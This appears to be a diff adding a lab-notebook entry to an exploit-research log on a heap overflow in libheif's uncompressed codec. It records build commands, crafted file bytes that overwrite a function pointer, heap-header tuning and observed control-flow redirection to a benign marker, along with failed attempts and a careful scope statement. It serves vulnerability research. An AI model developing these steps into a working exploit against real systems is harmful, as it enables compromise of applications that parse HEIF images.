@@ -545,3 +545,76 @@ labeled build/codec scope. The first encoder-sizing frame is harness-created;
 the uncompressed sequence cannot itself carry mixed decoded sizes, so this is
 not a single-file remote attack. No pointer target, marker, command, ASan
 run on this build, live network consumer or witness replay. Rung 5 UNKNOWN.
+
+## W179 file-derived valid pointer and benign marker (2026-11-23)
+
+Builds. Vulnerable: the W178 pinned `v1.23.6` `-O0 -g` tree at
+`/tmp/libheif2shell-unci` (`WITH_UNCOMPRESSED_CODEC=ON`, X265 built in, no
+JPEG/AOM/libde265, no examples, static, no plugin loading). Fixed: the same
+W161 pinned fix tree at `/tmp/libheif2shell-fixed-src` configured into
+`/tmp/w179-fixed-unci` with the same flags plus
+`-DCMAKE_BUILD_TYPE=Release -DCMAKE_CXX_FLAGS_RELEASE='-O0 -DNDEBUG'`;
+`ninja -j1 libheif/libheif.a` completed 119 steps in 251.89s. Neither build
+tree is committed.
+
+Drivers and replay. `real/reencode_interpose_marker.cc` is the W171
+interposer plus `SYNTH_FIRST`/`TW`/`TH`, a distinct `control_marker()` initial
+fn, a guarded call of the (possibly overwritten) fn, and `STOP_AFTER_ONE` to
+end decoding after the measured overflow. Both drivers are compiled `-no-pie`
+so `benign_marker()` has a fixed address; the committed runner reads it with
+`nm` and passes it to `neighbour/make_pointer_row.py`, which patches the two
+row-64 samples of the committed W178 `byte-exact.heif` in place. Link line
+(same for both builds):
+
+```
+SRC=lab/frontier/libheif2shell/src/libheif-v1.23.6
+g++ -std=c++17 -g -O0 -no-pie -U_GNU_SOURCE -I"$SRC/libheif/api" -I"$BUILD" \
+  lab/frontier/libheif2shell/real/reencode_interpose_marker.cc \
+  "$BUILD/libheif/libheif.a" $(pkg-config --libs x265 libjpeg zlib) \
+  -lsharpyuv -lbrotlidec -lbrotlienc -lbrotlicommon -ldl -o DRIVER
+bash lab/frontier/libheif2shell/real/run_pointer.sh \
+  /tmp/libheif2shell-unci /tmp/w179-fixed-unci \
+  lab/frontier/libheif2shell/real/neighbour/evidence/pointer
+python3 lab/frontier/libheif2shell/real/neighbour/check_pointer.py \
+  lab/frontier/libheif2shell/real/neighbour/evidence/pointer
+```
+
+`nm` on the vulnerable driver: `benign_marker()` at `0x408346`,
+`control_marker()` at `0x408360`. Crafted input SHA-256
+`7f9aadb5da6cdbf23a12ca0e6ca7b37d2e11cd28512259bbcb557b4d25bebf4c`;
+row bytes `90*24 21 80 00 00 00 00 00 00 46 83 40 00 00 00 00 00 90*24`
+(little-endian neighbour size 0x8021 then the pointer).
+
+Observed (all three rc 0, `PASS=16 FAIL=0` on the checker; only heap addresses
+vary between replays): attack log `CALLOC32783 count=2 ... == A`,
+`VICTIM fn=0x408346`, `HEADER B-8=0x8021`, `POST fn=0x408346
+expected=0x408346`, `BENIGN_MARKER_CALLED`. Safe control (same file,
+`TW=64 TH=65`, no `SYNTH_FIRST`) `VICTIM fn=0x408360`,
+`CONTROL_FN_UNCHANGED`. Fixed control `encode: rc=2 sub=0 ... All frames of a
+sequence must have the size of the first frame`, fn unchanged,
+`CONTROL_FN_UNCHANGED`. The runner builds both drivers in a `mktemp` dir and
+removes it on exit, so no binaries enter the evidence tree.
+
+Preserved negatives. (a) First pointer row used `0x9090...` for the neighbour
+chunk header: `VICTIM fn=0x9090909090909090` and the process aborted in
+`sysmalloc` (`malloc.c:2599`) before reaching the call; writing `0x8020`
+(the post-`free(A)` header) still aborted, while `0x8021` (A allocated again)
+gave the clean triad. (b) Decoding the second file frame after the overwrite
+aborted `malloc(): corrupted top size` / `sysmalloc`; the measured leg stops
+after one frame, and this is labelled a harness lifetime choice. (c) A
+single-file mixed-size attempt split the uncv track into two `stsd` entries
+(512x64 and 64x65) with `stsc` mapping one sample per chunk and corrected
+`stco` after the moov grew 195 bytes. Frame 0 decoded 512x64, but pinned
+v1.23.6 `track_visual.cc:219-311` selects the decoder through
+`m_next_sample_to_be_decoded % timeline.size()`; after both samples are
+pushed that index wraps to chunk 0, so the second decoder's image is never
+requested and the call fails `rc=7 Did not decode all frames`. The
+single-file mixed-size uncompressed lane stays falsified, not assumed.
+
+Scope. Rung 3 plus rung 4 only. The pointer is a harness-chosen non-PIE code
+address carried in lab-crafted file bytes; the adjacent live object, its
+adjacency (interposed `calloc`), the retained frame and the early stop are
+harness setup; the first encoder-sizing frame is harness-created; the marker
+is in-process. No real consumer, socket, command, valid-address derivation
+from ASLR, witness verdict or rung 5. The older replay requests remain
+queued; #3035 covers W178 and a W179 request is on tape.
